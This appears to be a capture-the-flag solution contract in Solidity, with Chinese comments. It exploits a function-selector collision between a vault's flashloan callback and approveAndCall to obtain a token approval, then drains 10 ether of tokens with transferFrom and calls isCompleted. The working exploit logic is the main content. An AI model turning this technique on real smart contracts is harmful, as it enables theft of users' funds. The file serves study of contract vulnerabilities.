// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;
import"./finance.sol";
//figData用来计算函数checkData的函数选择器
contract figure {
    check che;
    constructor(address _che){
        che = check(_che);
    }
    function figData()public pure returns(bytes4){
        return financeVault.checkData.selector;
    }
    //fig计算approve的data，题目思路是onHintFinanceFlashloan与approveAndCall
    //拥有相同的函数选择器，所以只要在调用flashloan的时候，依次传入
    //token地址，题目合约地址,0,0xa0,0,以及fig计算出的data，即可得到approve
    //最后经过transferFrom即可调用isCompleted获得满分。
    function fig() public view returns (bytes memory) {
        return
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                10 ether
            );
    }

    function attck()public{
        che.flashloan(address(che.erc20()),address(che),0,0xa0,false,fig());
        che.erc20().transferFrom(address(che),address(this),10 ether);
        che.isCompleted(figData());
    }

}